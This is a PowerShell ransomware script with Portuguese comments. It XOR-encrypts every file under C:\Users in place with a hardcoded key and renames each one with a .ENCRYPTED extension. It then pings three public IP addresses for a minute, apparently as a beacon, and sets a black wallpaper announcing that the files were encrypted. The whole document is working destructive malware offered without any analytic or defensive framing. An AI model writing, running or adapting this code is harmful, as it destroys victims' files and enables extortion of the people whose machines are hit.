# === VARIÁVEIS ===
$Key        = [System.Text.Encoding]::UTF8.GetBytes("mO2MeuEd")
$TargetRoot = "C:\Users"
$IPs        = @("1.162.130.209","102.22.20.125","134.199.205.209")
$DelaySec   = 60                                          

# === CRIPTOGRAFA ===
function Encrypt-FileXOR {
    param($FilePath, $Key)
    if ($FilePath -notmatch "\\Windows\\" -and $FilePath -notmatch "\\Program Files") {
        $data = [System.IO.File]::ReadAllBytes($FilePath)
        for ($i=0; $i -lt $data.Length; $i++) {
            $data[$i] = $data[$i] -bxor $Key[$i % $Key.Length]
        }
        [System.IO.File]::WriteAllBytes($FilePath, $data)
        Rename-Item $FilePath "$FilePath.ENCRYPTED" -Force
    }
}

Get-ChildItem -Path $TargetRoot -Recurse -File -ErrorAction SilentlyContinue |
    Where-Object { ($_.Extension -ne ".sys") -and ($_.Extension -ne ".dll") } |
    ForEach-Object { try { Encrypt-FileXOR $_.FullName $Key } catch {} }

# === PINGA OS 3 IPs POR 1 MINUTO ===
$end = (Get-Date).AddSeconds($DelaySec)
while ((Get-Date) -lt $end) {
    foreach ($ip in $IPs) {
        # 1 pacote, timeout 500 ms, sem exibir na tela
        try { Test-Connection -ComputerName $ip -Count 1 -Delay 1 -TimeoutMilliseconds 500 | Out-Null } catch {}
    }
}

# === WALLPAPER DE RESGATE (já existente) ===
$bmpPath = "$env:TEMP\resgate.bmp"
Add-Type -AssemblyName System.Drawing
$bmp = New-Object System.Drawing.Bitmap(1024,768)
$g   = [System.Drawing.Graphics]::FromImage($bmp)
$g.FillRectangle([System.Drawing.Brushes]::Black, 0,0,1024,768)
$g.DrawString("SEUS ARQUIVOS FORAM ENCRIPTADOS!",
              (New-Object System.Drawing.Font("Arial",36)),
              [System.Drawing.Brushes]::Red, 90,340)
$bmp.Save($bmpPath, [System.Drawing.Imaging.ImageFormat]::Bmp)
$g.Dispose(); $bmp.Dispose()

Add-Type @"
using System.Runtime.InteropServices;
public class W { [DllImport("user32.dll")] public static extern bool SystemParametersInfo(int a,int b,string c,int d); }
"@
[W]::SystemParametersInfo(20,0,$bmpPath,3)

Write-Host "Concluído: criptografado, 1 min de pings executado e wallpaper alterado."